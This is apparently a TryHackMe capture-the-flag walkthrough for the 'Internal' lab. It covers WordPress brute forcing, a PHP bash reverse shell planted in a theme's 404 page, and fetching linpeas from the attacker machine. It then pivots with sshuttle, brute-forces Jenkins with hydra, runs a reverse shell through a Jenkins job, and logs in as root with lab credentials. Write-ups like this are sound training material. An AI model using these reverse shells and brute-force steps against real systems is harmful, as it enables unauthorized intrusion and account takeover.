# Internal

**Room Link:** [https://tryhackme.com/room/internal](https://tryhackme.com/room/internal)



## Scanning

### Initial Scan

<pre><code><strong>nmap -A 10.10.46.54
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (5) (2) (1).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

<pre><code><strong>nmap -p- 10.10.46.54
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (48) (1).png" alt=""><figcaption></figcaption></figure>

### TCP/80 - HTTP

```
gobuster dir -u http://10.10.46.54 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 30

```

<figure><img src="../../.gitbook/assets/image (46) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wordpress is running under both /blog and /wordpress. /blog has a login page

```
wpscan --url http://10.10.46.54
wpscan --url http://10.10.46.54/blog --passwords /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (30) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Credentials found

<pre><code><strong>Username: admin 
</strong><strong>Password: my2boys
</strong></code></pre>

Trying to login the page redirects to internal.htm so I add that to the host file.

```
vi /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (24) (3) (1).png" alt=""><figcaption></figcaption></figure>

We are able to successfully get into wordpress with the credentials

<figure><img src="../../.gitbook/assets/image (8) (1) (3).png" alt=""><figcaption></figcaption></figure>

Reverse Shell Failed Attempt

revshell.php code

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.120.18/443 0>&1'");
?>
```

```
vi revshell.php
zip revshell.zip revshell.php
nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Unable to upload the plugin due to write issues

<figure><img src="../../.gitbook/assets/image (14) (4) (1).png" alt=""><figcaption></figcaption></figure>

## Reverse Shell

TWENTY SEVENTEEN theme had a writable pages so I modified the 404 page with a reverse shell and then navigated to a page that does not exist.

<figure><img src="../../.gitbook/assets/image (44) (1) (1).png" alt=""><figcaption></figcaption></figure>

Just added the revshell.php code mentioned earlier.

<figure><img src="../../.gitbook/assets/image (32) (1) (2).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -lvnp 443
```

**Browser**

A page that doesn't exist to trigger the reverse shell.

```
http://www.internal.thm/blog/index.php/2020/08/03/hello-worlgd/
```

<figure><img src="../../.gitbook/assets/image (27) (1) (2).png" alt=""><figcaption></figcaption></figure>

Get full TTY shell

<pre><code><strong>python -c 'import pty; pty.spawn("/bin/bash")'
</strong>ctrl + Z
stty raw -echo;fg
</code></pre>

### LinPeas

**Kali**

```
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp/
wget http://10.10.120.18:81/linpeas.sh
chmod +x linpeas.sh 
./linpeas.sh
```

Linpeas was able to find two sets of credentials. phpmyadmin credentials worked.

```
phpmyadmin
Username: phpmyadmin                                                                                                                
Password: B2Ud4fEOZmVq

note 
Username: aubreanna
Password: bubb13guM!@#123
```

The note for Bill

```
cat /opt/wp-save.txt 
```

<figure><img src="../../.gitbook/assets/image (47) (1) (1).png" alt=""><figcaption></figcaption></figure>

Able to ssh in with the credentials. There is a file that says that Jenkins is running and we can confirm that is is running with netstat as well.

```
ssh aubreanna@10.10.46.54
Password: bubb13guM!@#123
cat jenkins.txt
netstat -tuan
```

<figure><img src="../../.gitbook/assets/image (2) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>

### Pivot

From Kali I am now able to reach the Jenkins server

**Option #1**

For the rest of guide I used this option.

```
apt install sshuttle
sshuttle -r aubreanna@10.10.46.54 127.0.0.1/24
Password: bubb13guM!@#123
```

<figure><img src="../../.gitbook/assets/image (45) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Option #2**

If I followed this way jenkins would be redirected to port 4444 on kali.

```
ssh -L 4444:172.17.0.2:8080 aubreanna@10.10.46.54
Password: bubb13guM!@#123
```

### Bruteforce

After checking for some time I couldn't find any files with credentials that worked and the jenkins server is being ran on docker and I had no access to anything for that  so I resorted to using hydra. What I did was tried logging in with fake credentials than seeing the request and copying the info I needed to start bruteforcing.

```
File: /j_acegi_security_check
Request Body: j_username=test&j_password=pass&from=%2F&Submit=Sign+in
Failed login message: Invalid username or password
```

<figure><img src="../../.gitbook/assets/image (10) (1) (3).png" alt=""><figcaption></figcaption></figure>

The default hydra was giving false positives and not getting the correct credentials so I downloaded from gitlab and ran the bruteforcing again.

```
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra/
./configure
make
make install

./hydra 127.0.0.1 -s 8080 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P  /usr/share/wordlists/rockyou.txt
```

Credentials were found.

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
Username: admin
Password: spongebob
```

### Jenkins Web

<figure><img src="../../.gitbook/assets/image (33) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (13) (4) (1).png" alt=""><figcaption></figcaption></figure>

Just added a reverse shell to the job and ran it.

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.120.18/443 0>&1'
```

<figure><img src="../../.gitbook/assets/image (36) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

Setup a listener

```
nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (12) (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (3) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

There was a note under opt for Aubreanna that had the credentials for root.

<figure><img src="../../.gitbook/assets/image (15) (3) (1).png" alt=""><figcaption></figcaption></figure>

```
Username: root
Password: tr0ub13guM!@#123
```

Tried logging in with the credentials with ssh and it worked.

<pre><code>ssh root@10.10.56.152
<strong>Password: tr0ub13guM!@#123
</strong></code></pre>

